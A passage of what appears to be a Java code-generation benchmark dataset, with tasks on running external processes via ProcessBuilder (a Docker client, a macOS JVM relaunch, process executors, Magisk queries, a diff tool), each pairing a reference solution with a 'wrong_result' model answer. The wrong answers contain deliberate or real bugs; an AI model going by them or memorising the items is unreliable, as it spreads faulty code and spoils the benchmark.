    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.google.cloud.tools.jib.api.DescriptorDigest;\nimport com.google.cloud.tools.jib.api.DockerClient;\nimport com.google.cloud.tools.jib.api.DockerInfoDetails;\nimport com.google.cloud.tools.jib.api.ImageDetails;\nimport com.google.cloud.tools.jib.api.ImageReference;\nimport com.google.cloud.tools.jib.http.NotifyingOutputStream;\nimport com.google.cloud.tools.jib.image.ImageTarball;\nimport com.google.cloud.tools.jib.json.JsonTemplate;\nimport com.google.cloud.tools.jib.json.JsonTemplateMapper;\nimport com.google.common.collect.ImmutableMap;\nimport com.google.common.io.ByteStreams;\nimport com.google.common.io.CharStreams;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.security.DigestException;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\npublic class CliDockerClient implements DockerClient {\n\n  public static final Path DEFAULT_DOCKER_CLIENT = Paths.get(\"docker\");\n  public static final Long DOCKER_OUTPUT_TIMEOUT = (long) 10 * 60 * 1000;\n\n  private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n\n  public CliDockerClient(Path dockerExecutable, Map<String, String> dockerEnvironment) {\n    this(\n        defaultProcessBuilderFactory(\n            dockerExecutable.toString(), ImmutableMap.copyOf(dockerEnvironment)));\n  }\n\n  CliDockerClient(Function<List<String>, ProcessBuilder> processBuilderFactory) {\n    this.processBuilderFactory = processBuilderFactory;\n  }\n\n  private static Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(\n      String dockerExecutable, ImmutableMap<String, String> dockerEnvironment) {\n    return dockerSubCommand -> {\n      List<String> dockerCommand = new ArrayList<>(1 + dockerSubCommand.size());\n      dockerCommand.add(dockerExecutable);\n      dockerCommand.addAll(dockerSubCommand);\n\n      ProcessBuilder processBuilder = new ProcessBuilder(dockerCommand);\n      Map<String, String> environment = processBuilder.environment();\n      environment.putAll(dockerEnvironment);\n\n      return processBuilder;\n    };\n  }\n\n  private static String getStderrOutput(Process process) {\n    try (InputStreamReader stderr =\n        new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8)) {\n      return CharStreams.toString(stderr);\n    } catch (IOException ex) {\n      return \"unknown (failed to read error message from stderr due to \" + ex.getMessage() + \")\";\n    }\n  }\n\n  private Process docker(String... subCommand) throws IOException {\n    return processBuilderFactory.apply(Arrays.asList(subCommand)).start();\n  }\n\n  @Override\n  public DockerInfoDetails info() throws IOException, InterruptedException {\n    ExecutorService executor = Executors.newSingleThreadExecutor();\n    Future<DockerInfoDetails> readerFuture = executor.submit(this::fetchInfoDetails);\n    try {\n      DockerInfoDetails details = readerFuture.get(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS);\n      return details;\n    } catch (TimeoutException e) {\n      readerFuture.cancel(true);\n      throw new IOException(\"Timeout reached while waiting for 'docker info' output\");\n    } catch (ExecutionException e) {\n      throw new IOException(\"Failed to read output of 'docker info': \" + e.getMessage());\n    } finally {\n      executor.shutdownNow();\n    }\n  }\n\n  private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n    Process infoProcess = docker(\"info\", \"-f\", \"{{json .}}\");\n    InputStream inputStream = infoProcess.getInputStream();\n    if (infoProcess.waitFor() != 0) {\n      throw new IOException(\n          \"'docker info' command failed with error: \" + getStderrOutput(infoProcess));\n    }\n    return JsonTemplateMapper.readJson(inputStream, DockerInfoDetails.class);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "import java.io.*;\nimport java.nio.file.Path;\nimport java.util.*;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\n\npublic class CliDockerClient {\n    private final Function<List<String>, ProcessBuilder> processBuilderFactory;\n    private static final Path DEFAULT_DOCKER_CLIENT = Paths.get(\"docker\");\n    private static final long DOCKER_OUTPUT_TIMEOUT = 600000; // 10 minutes\n\n    public CliDockerClient(Path dockerPath, Map<String, String> env) {\n        this.processBuilderFactory = defaultProcessBuilderFactory(dockerPath.toString(), env);\n    }\n\n    public CliDockerClient(Function<List<String>, ProcessBuilder> factory) {\n        this.processBuilderFactory = factory;\n    }\n\n    private Function<List<String>, ProcessBuilder> defaultProcessBuilderFactory(String dockerPath, Map<String, String> env) {\n        return args -> {\n            List<String> command = new ArrayList<>();\n            command.add(dockerPath);\n            command.addAll(args);\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.environment().putAll(env);\n            pb.redirectErrorStream(false);\n            return pb;\n        };\n    }\n\n    private String getStderrOutput(Process process) throws IOException, InterruptedException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line).append(\"\\n\");\n        }\n        reader.close();\n        return sb.toString();\n    }\n\n    public Process docker(String... args) throws IOException, InterruptedException {\n        ProcessBuilder pb = processBuilderFactory.apply(Arrays.asList(args));\n        Process process = pb.start();\n        try {\n            if (!process.waitFor(DOCKER_OUTPUT_TIMEOUT, TimeUnit.MILLISECONDS)) {\n                process.destroyForcibly();\n                throw new RuntimeException(\"Docker command timed out\");\n            }\n        } catch (InterruptedException e) {\n            process.destroy();\n            throw e;\n        }\n        return process;\n    }\n\n    public DockerInfoDetails info() throws IOException, InterruptedException {\n        Process process = docker(\"info\");\n        String stderr = getStderrOutput(process);\n        if (!stderr.isEmpty()) {\n            throw new RuntimeException(\"Docker info command failed: \" + stderr);\n        }\n        return fetchInfoDetails();\n    }\n\n    private DockerInfoDetails fetchInfoDetails() throws IOException, InterruptedException {\n        Process process = docker(\"info\");\n        StringBuilder stdout = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            stdout.append(line).append(\"\\n\");\n        }\n        reader.close();\n        return new DockerInfoDetails(stdout.toString());\n    }\n}"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Verify and ensure the Java Virtual Machine (JVM) is running on the first thread on macOS, relaunching the process if necessary with the correct arguments.\n\nFunction Description: This function checks if the JVM is running on the first thread on macOS, which is required for proper execution of certain applications. If not, it attempts to relaunch the process with the \"-XstartOnFirstThread\" argument. The function handles process creation, stream redirection, and output/error handling during the relaunch.\n\nInput: \n- args: String[] - Command-line arguments to be passed to the relaunched process (if needed)\n\nOutput: \n- boolean - Returns true if the JVM is already in a valid state (either not on macOS or already running on first thread), or false if a relaunch was attempted (the original process should exit in this case)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.lang.management.ManagementFactory;\n\npublic static boolean verifyValidJVMState(String[] args){\n    if (SharedLibraryLoader.isMac){\n        if (\"1\".equals(System.getenv(\"JAVA_STARTED_ON_FIRST_THREAD_\" +\n                ManagementFactory.getRuntimeMXBean().getName().split(\"@\")[0]))) {\n            return true;\n        }\n\n        if (\"true\".equals(System.getProperty(\"shpdRelaunched\"))){\n            System.err.println(\"Error: Could not verify new process is running on the first thread. Trying to run the game anyway...\");\n            return true;\n        }\n\n        String sep = System.getProperty(\"file.separator\");\n\n        ArrayList<String> jvmArgs = new ArrayList<>();\n        jvmArgs.add(System.getProperty(\"java.home\") + sep + \"bin\" + sep + \"java\");\n        jvmArgs.add(\"-XstartOnFirstThread\");\n        jvmArgs.add(\"-DshpdRelaunched=true\");\n        jvmArgs.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());\n        jvmArgs.add(\"-cp\");\n        jvmArgs.add(System.getProperty(\"java.class.path\"));\n        jvmArgs.add(DesktopLauncher.class.getName());\n\n        System.err.println(\"Error: ShatteredPD must start on the first thread in order to work on macOS.\");\n        System.err.println(\"  To avoid this error, run the game with the \\\"-XstartOnFirstThread\\\" argument\");\n        System.err.println(\"  Now attempting to relaunch the game on the first thread automatically:\\n\");\n\n        try {\n            Process process = new ProcessBuilder(jvmArgs).redirectErrorStream(true).start();\n            BufferedReader out = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n\n            while ((line = out.readLine()) != null) {\n                if (line.toLowerCase().startsWith(\"error\")){\n                    System.err.println(line);\n                } else {\n                    System.out.println(line);\n                }\n            }\n\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return false;\n    }\n\n    return true;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public boolean checkAndRelaunch(String[] args) {\n    String os = System.getProperty(\"os.name\").toLowerCase();\n    if (!os.contains(\"mac\")) {\n        return true;\n    }\n    if (Thread.currentThread().getName().equals(\"main\")) {\n        return true;\n    }\n    String mainClass = this.getClass().getName();\n    List<String> command = new ArrayList<>();\n    command.add(\"java\");\n    command.add(\"-XstartOnFirstThread\");\n    command.add(mainClass);\n    Collections.addAll(command, args);\n    try {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n        process.waitFor();\n        System.exit(0);\n        return false;\n    } catch (Exception e) {\n        e.printStackTrace();\n        return false;\n    }\n}"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Implement a utility class for executing external processes synchronously and asynchronously in Java, handling input/output streams properly to prevent deadlocks, and collecting process output.\n\nClass Description: A ProcessExecutor utility class that provides methods to run external processes either synchronously (blocking until completion) or asynchronously (returning immediately), while properly managing process streams and errors.\n\nMethods:\n\nMethod1: runWith(List<String> cmd) -> Collection<String> - Executes a command synchronously and returns its output as a collection of strings. Handles both stdout and stderr streams by draining them concurrently to prevent deadlocks. The method blocks until the process completes.\n\nMethod2: runAsync(String... cmd) -> Process - Executes a command asynchronously and returns the Process object immediately without waiting for completion. The caller is responsible for handling the process streams and termination.\n\nMethod3: InputStreamDrainer(InputStream, OutputStream) -> void - [Internal helper class] A thread class that continuously reads from an input stream and writes to an output stream until EOF is reached. Used internally by runWith() to drain process streams.",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic static Collection<String> runWith(List<String> cmd) {\n    Collection<String> messages = new ArrayList<>();\n    try {\n        Process p = new ProcessBuilder(cmd).start();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n\n        // drain streams, else we might lock up\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), baos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), baos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int err = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        messages.add(baos.toString());\n    } catch (IOException ex) {\n        return Collections.singleton(ex.getMessage());\n    } catch (InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n    return messages;\n}\n\npublic static Process runAsync(String... cmd) {\n    try {\n        return new ProcessBuilder(cmd).start();\n    } catch (IOException ex) {\n        throw new IllegalStateException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    static class InputStreamDrainer extends Thread {\n        private final InputStream input;\n        private final OutputStream output;\n\n        public InputStreamDrainer(InputStream input, OutputStream output) {\n            this.input = input;\n            this.output = output;\n        }\n\n        @Override\n        public void run() {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(input))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    output.write(line.getBytes(StandardCharsets.UTF_8));\n                    output.write('\\n');\n                }\n            } catch (IOException e) {\n                // Handle or log the exception\n            }\n        }\n    }\n\n    public Collection<String> runWith(List<String> cmd) {\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        Process process = pb.start();\n\n        ByteArrayOutputStream stdout = new ByteArrayOutputStream();\n        ByteArrayOutputStream stderr = new ByteArrayOutputStream();\n\n        InputStreamDrainer stdoutDrainer = new InputStreamDrainer(process.getInputStream(), stdout);\n        InputStreamDrainer stderrDrainer = new InputStreamDrainer(process.getErrorStream(), stderr);\n\n        stdoutDrainer.start();\n        stderrDrainer.start();\n\n        try {\n            process.waitFor();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            // Handle exception\n        }\n\n        String stdoutStr = new String(stdout.toByteArray(), StandardCharsets.UTF_8);\n        String stderrStr = new String(stderr.toByteArray(), StandardCharsets.UTF_8);\n\n        List<String> outputLines = new ArrayList<>();\n        outputLines.addAll(Arrays.asList(stdoutStr.split(\"\\n\")));\n        outputLines.addAll(Arrays.asList(stderrStr.split(\"\\n\")));\n\n        return outputLines;\n    }\n\n    public Process runAsync(String... cmd) {\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        Process process = pb.start();\n        return process;\n    }\n}"
  },
  {
    "Task_id": 293,
    "Instruction": "Task Description: Create a utility class for executing external processes in Java, handling both command execution and process stream management.\n\nClass Description: A ProcessExecutor utility class that provides methods to execute system commands and external processes, capturing their output and error streams, with proper resource cleanup.\n\nMethods:\n\nMethod1: runCmd(String... cmd) -> String - Executes a command using ProcessBuilder, captures the output stream, and checks the exit status. Throws exceptions if the process fails.\nInput: cmd - Varargs parameter representing the command and its arguments\nOutput: String - The output from the process's standard output stream\n\nMethod2: runExec(String[] argv) -> String - Executes a command using Runtime.exec(), captures the output stream, and checks the exit status. Throws exceptions if the process fails.\nInput: argv - String array representing the command and its arguments\nOutput: String - The output from the process's standard output stream\n\nMethod3: processOutputStreamInThread(Process process) -> void - Helper method that reads and discards process output in a separate thread to prevent stream blocking.\nInput: process - The Process object whose output stream needs to be processed\nOutput: None (void)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\n\npublic static String runCmd(String... cmd) throws IOException, InterruptedException {\n    String output;\n    Process process = null;\n    try {\n        process = new ProcessBuilder(cmd).start();\n        output = StringUtil.readInputStream(process.getInputStream());\n        process.waitFor();\n        if (process.exitValue() != 0) {\n            System.err.println(String.format(\"%s Failed! Please check your signature file.\\n\", cmd[0]));\n            throw new RuntimeException(StringUtil.readInputStream(process.getErrorStream()));\n        }\n    } finally {\n        if (process != null) {\n            process.destroy();\n        }\n    }\n    return output;\n}\n\npublic static String runExec(String[] argv) throws IOException, InterruptedException {\n    Process process = null;\n    String output;\n    try {\n        process = Runtime.getRuntime().exec(argv);\n        output = StringUtil.readInputStream(process.getInputStream());\n        process.waitFor();\n        if (process.exitValue() != 0) {\n            System.err.println(String.format(\"%s Failed! Please check your signature file.\\n\", argv[0]));\n            throw new RuntimeException(StringUtil.readInputStream(process.getErrorStream()));\n        }\n    } finally {\n        if (process != null) {\n            process.destroy();\n        }\n    }\n    return output;\n}\n\nprivate static void processOutputStreamInThread(Process process) throws IOException {\n    InputStreamReader ir = new InputStreamReader(process.getInputStream());\n    LineNumberReader input = new LineNumberReader(ir);\n    while (input.readLine() != null) {\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    public static String runCmd(String... cmd) throws IOException, InterruptedException {\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        Process process = pb.start();\n        StringBuilder output = new StringBuilder();\n        Thread outputThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    output.append(line).append(\"\\n\");\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        outputThread.start();\n        processOutputStreamInThread(process);\n        outputThread.join();\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed with exit code \" + exitCode);\n        }\n        return output.toString();\n    }\n\n    public static String runExec(String[] argv) throws IOException, InterruptedException {\n        Process process = Runtime.getRuntime().exec(argv);\n        StringBuilder output = new StringBuilder();\n        Thread outputThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    output.append(line).append(\"\\n\");\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        outputThread.start();\n        processOutputStreamInThread(process);\n        outputThread.join();\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed with exit code \" + exitCode);\n        }\n        return output.toString();\n    }\n\n    public static void processOutputStreamInThread(Process process) {\n        new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Discard error output\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n}"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Create a Java class that manages the execution of external processes, handles their input/output streams, and provides mechanisms for process termination and output handling through callbacks.\n\nClass Description: The ProcessExecutor class is responsible for executing external processes using ProcessBuilder, managing their lifecycle, and providing real-time output handling through a callback interface. It uses a thread pool for asynchronous execution and includes methods for graceful termination.\n\nAttributes:\n- mProcessBuilder: ProcessBuilder - Configures and manages the external process to be executed\n- mProcess: Process - Represents the currently running external process instance\n- mExecutor: ThreadPoolExecutor - Manages the thread used for asynchronous process execution\n\nMethods:\n- ProcessExecutor(Path scriptPath, Path libraryPath) -> void - Constructor that initializes the ProcessBuilder with the given script and library paths\n- execute(ProcessOutputHandler outputHandler) -> void - Starts the external process asynchronously and handles its output through the provided callback interface\n- terminate() -> void - Terminates the running process and shuts down the executor service\n- interface ProcessOutputHandler - Callback interface for handling process output, completion, and errors\n  - handleOutput(String output) -> void - Called for each line of output from the process\n  - handleCompletion(int exitCode) -> void - Called when the process completes with its exit code\n  - handleError(String errorMessage) -> void - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.file.Path;\nimport java.util.concurrent.ThreadPoolExecutor;\n\npublic class ProcessExecutor {\n\n    private ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder();\n        mProcessBuilder.command(scriptPath.toString(), libraryPath.toString());\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor = ThreadPool.CACHED;\n        mExecutor.execute(() -> {\n            try {\n                mProcess = mProcessBuilder.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    outputHandler.handleOutput(line);\n                }\n\n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch(InterruptedException ie) {\n                outputHandler.handleError(\"Process was interrupted\");\n            } catch(IOException ioe) {\n                outputHandler.handleError(\"IO Error during process execution\");\n            }\n        });\n    }\n\n    public void terminate() {\n        if(mProcess != null) {\n            mProcess.destroy();\n        }\n        if(mExecutor != null) {\n            mExecutor.shutdownNow();\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    private ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder();\n        mProcessBuilder.command(scriptPath.toString(), libraryPath.toString());\n        mExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(1);\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor.submit(() -> {\n            try {\n                mProcess = mProcessBuilder.start();\n                mExecutor.submit(() -> {\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            outputHandler.handleOutput(line);\n                        }\n                    } catch (IOException e) {\n                        outputHandler.handleError(e.getMessage());\n                    }\n                });\n\n                mExecutor.submit(() -> {\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            outputHandler.handleError(line);\n                        }\n                    } catch (IOException e) {\n                        outputHandler.handleError(e.getMessage());\n                    }\n                });\n\n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch (IOException | InterruptedException e) {\n                outputHandler.handleError(e.getMessage());\n            }\n        });\n    }\n\n    public void terminate() {\n        if (mProcess != null) {\n            mProcess.destroyForcibly();\n        }\n        if (mExecutor != null) {\n            mExecutor.shutdown();\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: The task involves creating utility functions for executing system commands and retrieving information about the Magisk tool using Java's ProcessBuilder for inter-process communication.\n\nFunction Description: The provided code consists of three utility functions that work with system processes to execute commands and retrieve Magisk-related information. These functions demonstrate proper process handling, stream management, and error handling in Java.\n\nMethods:\n\nMethod1: exec(String... command) -> void - Executes a system command using ProcessBuilder. Takes a variable number of strings representing the command and its arguments. Logs the exit code or any errors encountered during execution.\n\nMethod2: getMagiskVersionCode() -> int - Retrieves the version code of Magisk by executing 'magisk -V' command. Returns the version code as an integer, or -1 if an error occurs. Caches the result for subsequent calls.\n\nMethod3: getMagiskTmpfsPath() -> String - Retrieves the tmpfs path used by Magisk by executing 'magisk --path' command. Returns the path as a string, or an empty string if an error occurs. Checks Magisk version first and returns '/sbin' for older versions (<21000). Caches the result for subsequent calls.\n\nAttributes:\nmagiskVersionCode: int - Caches the Magisk version code to avoid repeated process execution\nmagiskTmpfsPath: String - Caches the Magisk tmpfs path to avoid repeated process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.Executors;\n\npublic static void exec(String... command) {\n    ProcessBuilder pb = new ProcessBuilder(command);\n    try {\n        Process process = pb.start();\n        int code = process.waitFor();\n        Log.i(TAG, \"Exec \" + command[0] + \" exited with \" + code);\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec \" + command[0], e);\n    }\n}\n\npublic static int getMagiskVersionCode() {\n    if (magiskVersionCode != -1) {\n        return magiskVersionCode;\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"-V\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        String line = in.readLine();\n        Log.i(TAG, \"Exec magisk -V: \" + line);\n        magiskVersionCode = Integer.parseInt(line);\n        pr.waitFor();\n        in.close();\n        return magiskVersionCode;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk -V\", e);\n        return -1;\n    }\n}\n\npublic static String getMagiskTmpfsPath() {\n    if (magiskTmpfsPath != null) {\n        return magiskTmpfsPath;\n    }\n\n    if (getMagiskVersionCode() < 21000) {\n        return \"/sbin\";\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"--path\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        magiskTmpfsPath = in.readLine();\n        Log.i(TAG, \"Exec magisk --path: \" + magiskTmpfsPath);\n        pr.waitFor();\n        in.close();\n        return magiskTmpfsPath;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk --path\", e);\n        return \"\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class MagiskUtils {\n    private int magiskVersionCode = -1;\n    private String magiskTmpfsPath = \"\";\n\n    public void exec(String... command) {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        try {\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            while ((line = errorReader.readLine()) != null) {\n                System.err.println(line);\n            }\n            int exitCode = process.waitFor();\n            System.out.println(\"Exit code: \" + exitCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int getMagiskVersionCode() {\n        if (magiskVersionCode != -1) {\n            return magiskVersionCode;\n        }\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"magisk\", \"-V\");\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line = reader.readLine();\n            if (line != null) {\n                String[] parts = line.split(\"\\\\s+\");\n                if (parts.length > 0) {\n                    try {\n                        magiskVersionCode = Integer.parseInt(parts[0]);\n                        return magiskVersionCode;\n                    } catch (NumberFormatException e) {\n                        magiskVersionCode = -1;\n                    }\n                }\n            }\n            magiskVersionCode = -1;\n        } catch (Exception e) {\n            magiskVersionCode = -1;\n        }\n        return magiskVersionCode;\n    }\n\n    public String getMagiskTmpfsPath() {\n        if (!magiskTmpfsPath.isEmpty()) {\n            return magiskTmpfsPath;\n        }\n        int version = getMagiskVersionCode();\n        if (version < 21000) {\n            magiskTmpfsPath = \"/sbin\";\n            return magiskTmpfsPath;\n        }\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"magisk\", \"--path\");\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line = reader.readLine();\n            if (line != null) {\n                magiskTmpfsPath = line.trim();\n                return magiskTmpfsPath;\n            }\n        } catch (Exception e) {\n            magiskTmpfsPath = \"\";\n        }\n        return magiskTmpfsPath;\n    }\n}"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes an external diff tool to compare two files and generate a difference file, while capturing and logging the tool's output.\n\nFunction Description: The function `diffFile` executes an external diff utility specified by its path and arguments, comparing two input files (old and new versions) and generating a difference file. It captures the standard output and error streams of the external process, logs them, and waits for the process to complete before returning.\n\nInput:\n- `mCustomDiffPath`: String - Path to the external diff tool executable\n- `mCustomDiffPathArgs`: String - Arguments to pass to the diff tool (space-separated)\n- `oldFile`: File - The original file to compare against\n- `newFile`: File - The modified file to compare\n- `diffFile`: File - The output file where differences will be written\n\nOutput:\n- None (void) - The function doesn't return any value but writes the diff output to the specified file and logs the process output\n- Throws IOException if process execution fails\n- Throws InterruptedException if the process is interrupted while waiting",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException {\n    String outPath = diffFile.getAbsolutePath();\n    String cmd = mCustomDiffPath;\n    List<String> cmds = new ArrayList<>();\n    for (String s : cmd.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    for (String s : mCustomDiffPathArgs.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    cmds.add(oldFile.getAbsolutePath());\n    cmds.add(newFile.getAbsolutePath());\n    cmds.add(outPath);\n\n    ProcessBuilder pb = new ProcessBuilder(cmds);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    String line;\n    while ((line = br.readLine()) != null) {\n        Logger.d(line);\n    }\n    int exitCode = process.waitFor();\n    process.destroy();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException, InterruptedException {\n    String[] args = mCustomDiffPathArgs.split(\"\\\\s+\");\n    String[] command = new String[args.length + 3];\n    command[0] = mCustomDiffPath;\n    System.arraycopy(args, 0, command, 1, args.length);\n    command[args.length + 1] = oldFile.getAbsolutePath();\n    command[args.length + 2] = newFile.getAbsolutePath();\n\n    ProcessBuilder pb = new ProcessBuilder(command);\n    pb.redirectOutput(ProcessBuilder.Redirect.PIPE);\n    pb.redirectError(ProcessBuilder.Redirect.PIPE);\n    Process process = pb.start();\n\n    try (FileOutputStream fos = new FileOutputStream(diffFile);\n         BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(fos))) {\n\n        Thread stdoutThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    writer.write(line);\n                    writer.newLine();\n                    System.out.println(line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread stderrThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    writer.write(line);\n                    writer.newLine();\n                    System.err.println(line);\n                }\n            } catch (IOException e) {\n                